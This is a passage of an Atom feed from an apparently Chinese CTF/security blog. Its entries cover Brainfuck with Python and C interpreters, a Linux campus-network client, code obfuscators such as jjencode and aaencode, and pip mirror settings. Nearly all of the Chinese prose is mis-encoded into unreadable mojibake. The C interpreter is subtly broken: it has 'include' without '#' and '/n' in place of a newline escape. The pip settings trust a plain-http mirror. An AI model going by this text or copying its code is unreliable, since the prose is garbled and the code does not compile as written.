    <content type="html"><![CDATA[<p>ä¸€äº›éšå†™é¢˜ä¸­å¯èƒ½ä¼šå‡ºæ­¤ç°è¿™ç§ä¸œè¥¿ï¼Œä¸‹é¢æˆ‘æ¥å¤§æ¦‚ä»‹ç»ä¸€ä¸‹ï¼š</p><p>å®˜æ–¹ç½‘ç«™: <a href="http://www.muppetlabs.com/~breadbox/bf/" target="_blank" rel="noopener">http://www.muppetlabs.com/~breadbox/bf/</a></p><p>BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), è¿™ä¸ªè¯­è¨€æœ¬èº«çš„è¯­è¨€æ¨¡å‹å¾ˆç®€å•, æœ‰ä¸€ä¸ªbyteæŒ‡é’ˆ, æœ‰ä¸€ä¸ªåˆå§‹åŒ–ä¸º0é•¿åº¦ä¸º30000 bytesçš„æ•°ç»„, byteæŒ‡é’ˆå¯ä»¥åœ¨æ•°ç»„å†…ä»»æ„ç§»åŠ¨, æ”¯æŒä¸‹é¢çš„å…«ç§æ“ä½œ, æŒ‡é’ˆåˆå§‹åŒ–æŒ‡å‘æ•°ç»„çš„å¼€å§‹. è¿™ä¸ªè¯­è¨€åªæ˜¯ä½œè€…ä¸ºäº†å†™ä¸€ä¸ªå¾ˆç®€å•çš„ç¼–è¯‘å™¨, æ‰è®¾è®¡çš„ä¸€é—¨è¯­è¨€, è¯­è¨€å’Œåå­—ä¸€æ ·, å¾ˆéš¾è¯»æ‡‚, ç®€å•çš„ä¸€äº›æ“ä½œç”¨BrainFuckæ¥å†™éƒ½å¾ˆå¤æ‚éš¾è¯».</p><p>å…«ç§æ“ä½œç¬¦å®šä¹‰å¦‚ä¸‹:</p><table><thead><tr><th>å­—ç¬¦</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>&gt;</td><td>æŒ‡é’ˆåŠ ä¸€</td></tr><tr><td>&lt;</td><td>æŒ‡é’ˆå‡ä¸€</td></tr><tr><td>+</td><td>æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼åŠ ä¸€</td></tr><tr><td>-</td><td>æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼å‡ä¸€</td></tr><tr><td>.</td><td>è¾“å‡ºæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå†…å®¹ï¼ˆASCIIç ï¼‰</td></tr><tr><td>,</td><td>è¾“å…¥å†…å®¹åˆ°æŒ‡é’ˆæŒ‡å‘çš„å•å…ƒï¼ˆASCIIç ï¼‰</td></tr><tr><td>[</td><td>å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ºé›¶ï¼Œå‘åè·³è½¬åˆ°å¯¹åº”çš„]æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„</td></tr><tr><td>]</td><td>å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ä¸ºé›¶ï¼Œå‘å‰è·³è½¬åˆ°å¯¹åº”çš„[æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„</td></tr></tbody></table><p>Brainfuckç¨‹åºå¯ä»¥ç”¨ä¸‹é¢çš„æ›¿æ¢æ–¹æ³•ç¿»è¯‘æˆCè¯­è¨€(å‡è®¾ptræ˜¯char*ç±»å‹)ï¼š</p><table><thead><tr><th>Brainfuck</th><th>C</th></tr></thead><tbody><tr><td>&gt;</td><td>++ptr;</td></tr><tr><td>&lt;</td><td>â€“ptr;</td></tr><tr><td>+</td><td>++*ptr;</td></tr><tr><td>-</td><td>â€“*ptr;</td></tr><tr><td>.</td><td>putchar(*ptr);</td></tr><tr><td>,</td><td>*ptr =getchar();</td></tr><tr><td>[</td><td>while (*ptr) {</td></tr><tr><td>]</td><td>}</td></tr></tbody></table><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;.</code></p><p>è¿™ä¸ªç¼–è¯‘åå°±æ˜¯  â€˜Hello World!â€™</p><p>å…¶å®åªè¦å·¥å…·å°±å¥½äº†ï¼ï¼ï¼<br>è´´ä¸€ä¸ªpythonå®ç°çš„è§£é‡Šå™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainloop</span><span class="params">(program, bracket_map)</span>:</span> </span><br><span class="line">    pc = <span class="number">0</span> </span><br><span class="line">    tape = Tape() </span><br><span class="line">    <span class="keyword">while</span> pc &lt; len(program): </span><br><span class="line">        code = program[pc] </span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>: </span><br><span class="line">            tape.advance() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>: </span><br><span class="line">            tape.devance() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>: </span><br><span class="line">            tape.inc() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>: </span><br><span class="line">            tape.dec() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>: </span><br><span class="line">            <span class="comment"># print </span></span><br><span class="line">            os.write(<span class="number">1</span>, chr(tape.get())) </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>: </span><br><span class="line">            <span class="comment"># read from stdin </span></span><br><span class="line">            tape.set(ord(os.read(<span class="number">0</span>, <span class="number">1</span>)[<span class="number">0</span>])) </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> <span class="keyword">and</span> tape.get() == <span class="number">0</span>: </span><br><span class="line">            <span class="comment"># Skip forward to the matching ] </span></span><br><span class="line">            pc = bracket_map[pc] </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> <span class="keyword">and</span> tape.get() != <span class="number">0</span>: </span><br><span class="line">            <span class="comment"># Skip back to the matching [ </span></span><br><span class="line">            pc = bracket_map[pc] </span><br><span class="line">        pc += <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tape</span><span class="params">(object)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape = [<span class="number">0</span>] </span><br><span class="line">        self.position = <span class="number">0</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">return</span> self.thetape[self.position] </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, val)</span>:</span> </span><br><span class="line">        self.thetape[self.position] = val </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inc</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape[self.position] += <span class="number">1</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape[self.position] -= <span class="number">1</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.position += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position: </span><br><span class="line">            self.thetape.append(<span class="number">0</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">devance</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.position -= <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(program)</span>:</span> </span><br><span class="line">    parsed = [] </span><br><span class="line">    bracket_map = &#123;&#125; </span><br><span class="line">    leftstack = [] </span><br><span class="line">    pc = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program: </span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>): </span><br><span class="line">            parsed.append(char) </span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>: </span><br><span class="line">                leftstack.append(pc) </span><br><span class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>: </span><br><span class="line">                left = leftstack.pop() </span><br><span class="line">                right = pc </span><br><span class="line">                bracket_map[left] = right </span><br><span class="line">                bracket_map[right] = left </span><br><span class="line">            pc += <span class="number">1</span> </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(parsed), bracket_map </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fp)</span>:</span> </span><br><span class="line">    program_contents = <span class="string">""</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        read = os.read(fp, <span class="number">4096</span>) </span><br><span class="line">        <span class="keyword">if</span> len(read) == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        program_contents += read </span><br><span class="line">    os.close(fp) </span><br><span class="line">    program, bm = parse(program_contents) </span><br><span class="line">    mainloop(program, bm) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    run(os.open(sys.argv[<span class="number">1</span>], os.O_RDONLY, <span class="number">0777</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨æ³•ï¼špython brain.py flag.br</span></span><br><span class="line"><span class="comment">#åœ¨.bræ–‡ä»¶ä¸­ä¿å­˜BrainFuckçš„ä»£ç </span></span><br></pre></td></tr></table></figure><p>cç¼–å†™çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;;</span><br><span class="line"><span class="keyword">int</span>  p, r, q;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5000</span>], f[<span class="number">5000</span>], b, o, *s=f;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret</span><span class="params">(<span class="keyword">char</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *d;</span><br><span class="line">        r++;</span><br><span class="line">        <span class="keyword">while</span>( *c ) &#123;</span><br><span class="line">                <span class="keyword">switch</span>(o=<span class="number">1</span>,*c++) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'&lt;'</span>: p--;        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'&gt;'</span>: p++;        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span>: a[p]++;     <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span>: a[p]--;     <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'.'</span>: <span class="built_in">putchar</span>(a[p]); fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">','</span>: a[p]=getchar();fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">                        <span class="keyword">for</span>( b=<span class="number">1</span>,d=c; b &amp;&amp; *c; c++ )</span><br><span class="line">                                b+=*c==<span class="string">'['</span>, b-=*c==<span class="string">']'</span>;</span><br><span class="line">                        <span class="keyword">if</span>(!b) &#123;</span><br><span class="line">                                c[<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">while</span>( a[p] )</span><br><span class="line">                                        interpret(d);</span><br><span class="line">                                c[<span class="number">-1</span>]=<span class="string">']'</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"UNBALANCED BRACKETS"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'#'</span>:</span><br><span class="line">                        <span class="keyword">if</span>(q&gt;<span class="number">2</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n"</span>,</span><br><span class="line">                                       *a,a[<span class="number">1</span>],a[<span class="number">2</span>],a[<span class="number">3</span>],a[<span class="number">4</span>],a[<span class="number">5</span>],a[<span class="number">6</span>],a[<span class="number">7</span>],a[<span class="number">8</span>],a[<span class="number">9</span>],<span class="number">3</span>*p+<span class="number">2</span>,<span class="string">"^"</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>: o=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( p&lt;<span class="number">0</span> || p&gt;<span class="number">100</span>)</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"RANGE ERROR"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        FILE *z;</span><br><span class="line">        q=argc;</span><br><span class="line">         <span class="keyword">if</span>(z=fopen(argv[<span class="number">1</span>],<span class="string">"r"</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span>( (b=getc(z))&gt;<span class="number">0</span> )</span><br><span class="line">                        *s++=b;</span><br><span class="line">                *s=<span class="number">0</span>;</span><br><span class="line">                interpret(f);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹å°±å¯ä»¥ç”¨äº†ã€‚</p><p>å—¯ï¼Œå°±è¿™äº›ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸€äº›éšå†™é¢˜ä¸­å¯èƒ½ä¼šå‡ºæ­¤ç°è¿™ç§ä¸œè¥¿ï¼Œä¸‹é¢æˆ‘æ¥å¤§æ¦‚ä»‹ç»ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;å®˜æ–¹ç½‘ç«™: &lt;a href=&quot;http://www.muppetlabs.com/~breadbox/bf/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mup
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linuxä¸‹ä½¿ç”¨é”æ·çš„æ–¹æ³•</title>
    <link href="http://zer0yu.github.io/2017/01/22/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://zer0yu.github.io/2017/01/22/Linuxä¸‹ä½¿ç”¨é”æ·çš„æ–¹æ³•/</id>
    <published>2017-01-22T02:45:46.000Z</published>
    <updated>2017-01-22T02:48:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®å¾ˆç®€å•ä¸€ä¸ªå‘½ä»¤å°±æå®šï¼ˆå‰ææ˜¯ä½ æœ‰è¿™ä¸ª<a href="https://pan.baidu.com/s/1bo13wYF" target="_blank" rel="noopener">è„šæœ¬</a>ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ä¸‹è½½ä¹‹åå…ˆè§£å‹ï¼š</span></span><br><span class="line"></span><br><span class="line">unzip RuijieForLinux.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ä¹‹å<span class="built_in">cd</span> è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">åœ¨ç„¶åå‘¢</span></span><br><span class="line"></span><br><span class="line">sudo chmod +x ./rjsupplicant.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å†ç„¶åå‘¢</span></span><br><span class="line"></span><br><span class="line">sudo ./rjsupplicant.sh -u ä½ çš„å­¦å· -p ä½ çš„å¯†ç  -s æ”¶è´¹èµ„æº/å…è´¹èµ„æº</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶ï¼Œå¯ä»¥é€šè¿‡ â€“helpå‘½ä»¤æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©æ–‡æ¡£</p><p>è´´ä¸ªæ•ˆæœå›¾ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å…¶å®å¾ˆç®€å•ä¸€ä¸ªå‘½ä»¤å°±æå®šï¼ˆå‰ææ˜¯ä½ æœ‰è¿™ä¸ª&lt;a href=&quot;https://pan.baidu.com/s/1bo13wYF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;è„šæœ¬&lt;/a&gt;ï¼‰&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTFä¸­é‚£äº›æœ‰è¶£çš„æ··æ·†</title>
    <link href="http://zer0yu.github.io/2017/01/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86/"/>
    <id>http://zer0yu.github.io/2017/01/22/CTFä¸­é‚£äº›æœ‰è¶£çš„æ··æ·†/</id>
    <published>2017-01-22T02:40:24.000Z</published>
    <updated>2017-01-22T02:41:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    ppencode/rrencode/jjencode/aaencodeæ˜¯Perlã€Rubyã€Javascriptçš„å°å·¥å…·ï¼Œå¯ä»¥å°†å„è‡ªçš„ä»£ç è¿›è¡Œæ··æ·†ï¼Œè½¬æ¢æˆç‰¹æ®Šå­—ç¬¦ï¼Œç”šè‡³è¿˜å¯ä»¥è½¬æ¢æˆæœ‰æ„æ€çš„è¡¨æƒ…ã€‚</p><h4 id="ppencode-Perl"><a href="#ppencode-Perl" class="headerlink" title="ppencode-Perl"></a>ppencode-Perl</h4><p>å°æ¹¾çš„Perlè¾¾äºº<a href="http://pugs.blogs.com/" target="_blank" rel="noopener">å”é³³</a>åœ¨<a href="http://yapcasia.org/2010/" target="_blank" rel="noopener">YAPC</a>æ›¾ç»ä»‹ç»è¿‡<a href="http://www.slideshare.net/autang/ppencode" target="_blank" rel="noopener">ppencode</a>ï¼Œå®ƒå¯ä»¥æŠŠPerlä»£ç è½¬æ¢æˆåªæœ‰è‹±æ–‡å­—æ¯çš„å­—ç¬¦ä¸²ã€‚</p><p>ä¸‹é¢æ˜¯è½¬æ¢ç¤ºä¾‹ï¼š</p><p>Demoçš„åœ°å€ï¼š<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">http://namazu.org/~takesako/ppencode/demo.html</a>ã€‚</p><h4 id="rrencode-Ruby"><a href="#rrencode-Ruby" class="headerlink" title="rrencode-Ruby"></a>rrencode-Ruby</h4><p>rrencodeå¯ä»¥æŠŠrubyä»£ç å…¨éƒ¨è½¬æ¢æˆç¬¦å·ã€‚</p><p>ä¸‹é¢æ˜¯è½¬æ¢ç¤ºä¾‹ï¼š</p><p>é¡¹ç›®åœ°å€ï¼š<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="noopener">http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html</a>ã€‚</p><h4 id="jjencode-aaencode-Javascript"><a href="#jjencode-aaencode-Javascript" class="headerlink" title="jjencode/aaencode-Javascript"></a>jjencode/aaencode-Javascript</h4><p><a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="noopener">jjencode</a>å’Œaaencodeéƒ½æ˜¯<a href="http://twitter.com/#!/hasegawayosuke" target="_blank" rel="noopener">Yosuke HASEGAWA</a>çš„ä½œå“ï¼Œå‰è€…å°†JSä»£ç è½¬æ¢æˆåªæœ‰ç¬¦å·çš„å­—ç¬¦ä¸²ï¼Œç±»ä¼¼äºrrencodeï¼Œä»‹ç»çš„PPTè§<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="noopener">http://utf-8.jp/public/20090710/jjencode.pps</a>ã€‚</p><p>åè€…æ›´å¥½ç©ï¼Œå¯ä»¥å°†JSä»£ç è½¬æ¢æˆå¸¸ç”¨çš„ç½‘ç»œè¡¨æƒ…ï¼Œä¾‹å¦‚â€œ(ï¾ŸÎ˜ï¾Ÿ)â€ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p>Demoçš„åœ°å€æ˜¯ï¼š<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a>ï¼Œè½¬æ¢çš„ä»£ç å¹¶ä¸å¤æ‚ï¼Œå¯ä»¥åœ¨æºä»£ç é‡Œçœ‹åˆ°ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;â€‹    ppencode/rrencode/jjencode/aaencodeæ˜¯Perlã€Rubyã€Javascriptçš„å°å·¥å…·ï¼Œå¯ä»¥å°†å„è‡ªçš„ä»£ç è¿›è¡Œæ··æ·†ï¼Œè½¬æ¢æˆç‰¹æ®Šå­—ç¬¦ï¼Œç”šè‡³è¿˜å¯ä»¥è½¬æ¢æˆæœ‰æ„æ€çš„è¡¨æƒ…ã€‚&lt;/p&gt;
&lt;h4 id=&quot;ppencode-Perl&quot;&gt;&lt;a href
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pipæºçš„ä¿®æ”¹</title>
    <link href="http://zer0yu.github.io/2017/01/22/pip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9/"/>
    <id>http://zer0yu.github.io/2017/01/22/pipæºçš„ä¿®æ”¹/</id>
    <published>2017-01-22T02:37:55.000Z</published>
    <updated>2017-01-22T02:39:59.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•-ä»¥python3-5ä¸ºä¾‹"><a href="#1-åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•-ä»¥python3-5ä¸ºä¾‹" class="headerlink" title="1:åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•(ä»¥python3.5ä¸ºä¾‹):"></a>1:åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•(ä»¥python3.5ä¸ºä¾‹):</h4><p>(1):åœ¨windowsæ–‡ä»¶ç®¡ç†å™¨ä¸­,è¾“å…¥ %APPDATA%</p><p>(2):ä¼šå®šä½åˆ°ä¸€ä¸ªæ–°çš„ç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ–°å»ºpipæ–‡ä»¶å¤¹ï¼Œç„¶ååˆ°pipæ–‡ä»¶å¤¹é‡Œé¢å»æ–°å»ºä¸ªpip.iniæ–‡</p><p>(3):åœ¨æ–°å»ºçš„pip.iniæ–‡ä»¶ä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼Œæå®š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure><h4 id="2ï¼šåœ¨linuxç³»ç»Ÿä¸­æ›´æ–°pipæºçš„æ–¹å¼-ä»¥centos-python2-7ä¸ºä¾‹"><a href="#2ï¼šåœ¨linuxç³»ç»Ÿä¸­æ›´æ–°pipæºçš„æ–¹å¼-ä»¥centos-python2-7ä¸ºä¾‹" class="headerlink" title="2ï¼šåœ¨linuxç³»ç»Ÿä¸­æ›´æ–°pipæºçš„æ–¹å¼(ä»¥centos,python2.7ä¸ºä¾‹)"></a>2ï¼šåœ¨linuxç³»ç»Ÿä¸­æ›´æ–°pipæºçš„æ–¹å¼(ä»¥centos,python2.7ä¸ºä¾‹)</h4><p>åœ¨linuxç¯å¢ƒä¸‹çš„ä¿®æ”¹æ–¹å¼å’Œåœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹æ–¹å¼åŸºæœ¬ç›¸åŒï¼Œè¿™é‡Œç®€å•æ€»ç»“ä¸€ä¸‹:</p><p>(1):åœ¨ç”¨æˆ·çš„å®¶ç›®å½•ä¸‹é¢åˆ›å»ºåä¸º.pipæ–‡ä»¶å¤¹</p><p>(2):åœ¨åˆ›å»ºå¥½çš„.pipæ–‡ä»¶å¤¹ä¸­åˆ›å»ºåä¸ºpip.confçš„æ–‡ä»¶</p><p>(3):åœ¨pip.confæ–‡ä»¶ä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼Œok!!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure><h4 id="3ï¼šmacOSæ›´æ”¹pipæº"><a href="#3ï¼šmacOSæ›´æ”¹pipæº" class="headerlink" title="3ï¼šmacOSæ›´æ”¹pipæº"></a>3ï¼šmacOSæ›´æ”¹pipæº</h4><p>åœ¨ç»ˆç«¯è¿›å…¥ç›®å½•ï¼š<code>cd ~/</code></p><p>å¦‚æœæ²¡æœ‰ .pip æ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆå°±è¦æ–°å»ºè¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œ<code>mkdir 